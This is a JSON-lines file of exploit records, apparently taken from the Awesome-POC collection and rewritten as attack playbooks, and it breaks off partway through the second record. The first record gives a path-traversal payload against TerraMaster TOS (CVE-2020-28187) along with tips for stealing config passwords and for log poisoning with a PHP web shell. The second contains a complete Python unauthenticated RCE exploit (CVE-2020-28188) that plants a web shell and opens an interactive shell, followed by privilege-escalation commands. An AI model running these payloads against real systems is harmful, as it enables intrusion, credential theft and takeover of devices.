{"id": "awesome-poc:cve-2020-28187", "kind": "poc", "title": "TerraMaster TOS 后台任意文件读取漏洞 CVE-2020-28187", "technique": "path-traversal", "summary": "Web应用漏洞 / CVE-2020-28187。载荷取自 Awesome-POC 的复现段落，已按实例值参数化。", "preconditions": ["目标产品与版本需落在 CVE-2020-28187 的影响范围内（先确认版本，再发载荷）", "载荷中的 {{host}} / {{target_url}} 按实际目标替换"], "target_stack": ["Web应用漏洞", "CVE-2020-28187"], "payload_template": "/tos/index.php?editor/fileGet&filename=../../../../../../etc/passwd", "verification_method": ["按 payload 原样发送；命中判据是响应出现该 CVE 的预期特征（回显、报错或读到的文件内容）。", "第一次没有预期响应时换下一条载荷，不要在同一句上反复微调。"], "known_failures": ["机制导入，从未在本平台靶机上验证过；版本不符时不会生效。"], "steps": ["确认目标版本在 CVE-2020-28187 影响范围内", "把 payload 中的占位符换成实际目标", "发送并把响应与预期特征比对"], "post_exploitation": ["先确认读得通：`/etc/passwd` 能出内容再往下，否则换编码（`..%2f`、`..%252f`、`....//`）。", "直接冲 flag 的常见位置：`/flag`、`/flag.txt`、`/tmp/flag`、`/root/flag`、`/home/*/flag`，以及应用目录下的 `config.php`/`.env`（里面有 DB 口令，可转 SQLi 或登录后台）。", "读不到就用日志投毒转 RCE：把 `<?php system($_GET[c]);?>` 写进 `access.log`，再 `?file=/var/log/apache2/access.log&c=id`。"], "provenance": {"source_type": "reference-corpus", "source_ref": "awesome-poc", "source_url": "https://github.com/Threekiii/Awesome-POC", "notes": "提取自 Web应用漏洞/TerraMaster TOS 后台任意文件读取漏洞 CVE-2020-28187.md 的复现段落"}, "trust_level": "unverified", "verified_solve": false, "published_at": null}
{"id": "awesome-poc:cve-2020-28188", "kind": "poc", "title": "TerraMaster TOS makecvs.php 远程命令执行漏洞 CVE-2020-28188", "technique": "rce", "summary": "Web应用漏洞 / CVE-2020-28188。载荷取自 Awesome-POC 的复现段落，已按实例值参数化。", "preconditions": ["目标产品与版本需落在 CVE-2020-28188 的影响范围内（先确认版本，再发载荷）", "载荷中的 {{host}} / {{target_url}} 按实际目标替换"], "target_stack": ["Web应用漏洞", "CVE-2020-28188"], "payload_template": "# Exploit Title: TerraMaster TOS 4.2.06 - RCE (Unauthenticated)\n# Date: 12/12/2020\n# Exploit Author: IHTeam\n# Full Write-up: https://www.ihteam.net/advisory/terramaster-tos-multiple-vulnerabilities/\n# Vendor Homepage: https://www.terra-master.com/\n# Version: <= 4.2.06\n# Tested on: 4.1.30, 4.2.06\n\n#!/usr/bin/env python3\nimport argparse\nimport requests\nimport time\nimport sys\nimport urllib.parse\nfrom requests.packages.urllib3.exceptions import InsecureRequestWarning\n\nrequests.packages.urllib3.disable_warnings(InsecureRequestWarning)\n\nparser = argparse.ArgumentParser(description=\"TerraMaster TOS <= 4.2.06 Unauth RCE\")\nparser.add_argument('--url', action='store', dest='url', required=True, help=\"Full URL and port e.g.: http://{{target_url}}:8081/\")\nargs = parser.parse_args()\n\nurl = args.url\nheaders = {'User-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36'}\nepoch_time = int(time.time())\nshell_filename = \"debug\"+str(epoch_time)+\".php\"\n\ndef check_endpoint(url, headers):\n\tresponse = requests.get(url+'/version', headers=headers, verify=False)\n\tif response.status_code == 200:\n\t\tprint(\"[+] TerraMaster TOS version: \", str(response.content))\n\telse:\n\t\tprint(\"\\n[-] TerraMaster TOS response code: \", response.status_code)\n\t\tsys.exit()\n\t\t\ndef upload_shell(url, headers, shell_filename):\n\tpayload = \"http|echo \\\"<?php echo(passthru(\\\\$_GET['cmd']));?>\\\" >> /usr/www/\"+shell_filename+\" && chmod +x /usr/www/\"+shell_filename+\"||\"\n\tpayload = urllib.parse.quote(payload, safe='')\n\tprint(\"[/] Uploading shell...\")\n\tresponse = requests.get(url+'/include/makecvs.php?Event='+payload, headers=headers, verify=False)\n\ttime.sleep(1)\n\tresponse = requests.get(url+'/'+shell_filename+'?cmd=cat /etc/passwd', headers=headers, verify=False)\n\tif ('root:' in str(response.content, 'utf-8')):\n\t\tprint(\"[+] Upload succeeded\")\n\telse:\n\t\tprint(\"\\n[-] Error uploading shell: \", response.content)\n\t\tsys.exit()\n\ndef interactive_shell(url, headers, shell_filename, cmd):\n\tresponse = requests.get(url+'/'+shell_filename+'?cmd='+urllib.parse.quote(cmd, safe=''), headers=headers, verify=False)\n\tprint(str(response.text)+\"\\n\")\n\n\ndef delete_shell(url, headers, shell_filename):\n\tdelcmd = \"rm /usr/www/\"+shell_filename\n\tresponse = requests.get(url+'/'+shell_filename+'?cmd='+urllib.parse.quote(delcmd, safe=''), headers=headers, verify=False)\n\tprint(\"\\n[+] Shell deleted\")\n\nupload_shell(url, headers, shell_filename)\ntry:\n\twhile True:\n\t\tcmd = input(\"# \")\n\t\tinteractive_shell(url, headers, shell_filename, cmd)\nexcept:\n\tdelete_shell(url, headers, shell_filename)", "verification_method": ["按 payload 原样发送；命中判据是响应出现该 CVE 的预期特征（回显、报错或读到的文件内容）。", "第一次没有预期响应时换下一条载荷，不要在同一句上反复微调。"], "known_failures": ["机制导入，从未在本平台靶机上验证过；版本不符时不会生效。"], "steps": ["确认目标版本在 CVE-2020-28188 影响范围内", "把 payload 中的占位符换成实际目标", "发送并把响应与预期特征比对"], "post_exploitation": ["先读进程环境再翻文件：`printenv | grep -i -e flag -e ctf -e key` —— 多数镜像把 flag 导出到 web 进程环境，这一步最快。", "环境为空就按内容搜而非名字：`grep -rIl -e 'CTF{' -e 'flag{' /var/www /srv /opt /tmp /usr/local /home 2>/dev/null` —— 文件名常是 fl4g/f1ag 或无提示名。", "仍为空就判断能否提权：`id; sudo -l; find / -perm -4000 -type f 2>/dev/null; cat /proc/version`；`/root` 常 0700、`/proc/1/environ` 常 0400，读不到就是读不到。"], "provenance": {"source_type": "reference-corpus", "source_ref": "awesome-poc", "source_url": "https://github.com/Threekiii/Awesome-POC", "notes": "提取自 Web应用漏洞/TerraMaster TOS makecvs.php 远程命令执行漏洞 CVE-2020-28188.md 的复现段落"}, "trust_leve